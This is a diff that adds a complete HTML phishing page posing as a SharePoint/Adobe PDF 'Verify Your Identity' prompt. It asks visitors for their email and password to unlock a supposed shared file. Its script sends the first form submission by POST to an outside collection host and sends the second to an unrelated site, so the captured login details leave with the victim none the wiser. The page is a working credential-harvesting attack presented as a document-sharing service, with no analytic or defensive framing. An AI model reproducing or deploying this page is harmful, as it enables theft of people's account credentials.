@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sharepoint - Verify</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background-color: #fff;
+      text-align: center;
+    }
+
+    .header {
+      background: #691011;
+      color: white;
+      font-size: 20px;
+      font-weight: 500;
+      text-align: left;
+      padding: 12px 20px;
+    }
+
+    .logo {
+      margin: 25px 0;
+    }
+
+    .card {
+      max-width: 350px;
+      margin: 0 auto;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+    }
+
+    .card h2 {
+      font-size: 25px;
+      font-weight: 500;
+      margin: 0 0 15px 0;
+    }
+
+    .content {
+      text-align: left;
+      font-size: 17px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .content .file {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+      font-weight: 500;
+    }
+
+    .file img {
+      width: 28px;
+      margin-right: 8px;
+      margin-bottom: 10px;
+    }
+
+    .verify-btn {
+      display: block;
+      width: 100%;
+      background: #691011;
+      color: white;
+      border: none;
+      border-radius: 3px;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .form-field {
+      text-align: left;
+      margin-bottom: 15px;
+    }
+
+    .form-field label {
+      font-size: 16px;
+      color: #333;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .form-field input {
+      width: 94%;
+      padding: 10px;
+      font-size: 14px;
+      border: none;
+      background-color: #f2f2f2;
+      border-bottom: 2px solid #691011;
+      outline: none;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 18px;
+    }
+
+    .footer a {
+      color: #691011;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="header">Adobe PDF</div>
+  <div class="logo">
+    <img
+      src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmWgAmtBzCMcGv1qIQl4E-67bK46wVgw5WhDDsI6ZbkiyWLmmKfjPqyvSj6uTPz-SEl3FgXMWkfQwfmFkWrNCd8VT1ROKtylbBscvT8yBDai-vTh31wa8KWPFDuSDG6l_poNu1G91JIoUpy9wsbwBOx4WbiAIlxcpMcipIxdIrusWN8mUuKXRtCv0oE3w/s320/Adobe_Corporate_logo.svg.png"
+      alt="Logo" height="60">
+  </div>
+
+  <div class="card">
+    <h2>Verify Your Identity</h2>
+    <div class="content">
+      <p>You've received a secure link to:</p>
+      <div class="file">
+        <img
+          src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgn86DXu05miVMk5nE-NADw_s7uDwK9l6KSmDG6QZ5hfzgq30Hprq5aUqSFGxHyV12Pd8ILF1p_lOsD8AGjgrDvKkwZ47Y2iz-yqnU_iSdK9ybmVz8Uiq0UV3zuI1Vzi0wgi64zVfCbRhrfNZycgd4qnOqObW-tE8yoyQ-09SzYqXk6viNn1xK3Q4d8EJs/s320/PDF_file_icon.svg.png"
+          alt="File" width="80px"> Shared file.
+      </div>
+      <p>To receive and download this PDF file, please enter specific professional email credentials that this
+        document was sent to.</p>
+    </div>
+
+    <form id="verifyForm">
+      <div class="form-field">
+        <label for="inputline1">Email:</label>
+        <input type="email" id="inputline1" name="user" required>
+      </div>
+
+      <div class="form-field">
+        <label for="password">Verify Password:</label>
+        <input type="password" id="password" name="pass" required>
+      </div>
+
+      <button type="submit" id="verifyBtn" class="verify-btn">Verify</button>
+    </form>
+  </div>
+
+  <div class="footer">
+    Copyright © 2025 All rights reserved.
+    <a href="#">Privacy</a> & <a href="#">Cookies</a>
+  </div>
+
+<script>
+  let submitCount = 0;
+  const form = document.getElementById("verifyForm");
+
+  form.addEventListener("submit", function (e) {
+    submitCount++;
+
+    if (submitCount === 1) {
+      // Allow normal form submission (page reload)
+      form.action = "https://v2.siecimnc.com.mx/auth/next.php"; 
+      form.method = "POST";
+    } else if (submitCount === 2) {
+      // Prevent reload, just redirect
+      e.preventDefault();
+      window.location.href = "https://www.sample.net/#hose";
+    }
+  });
+</script>
+
+</body>
+
+</html>
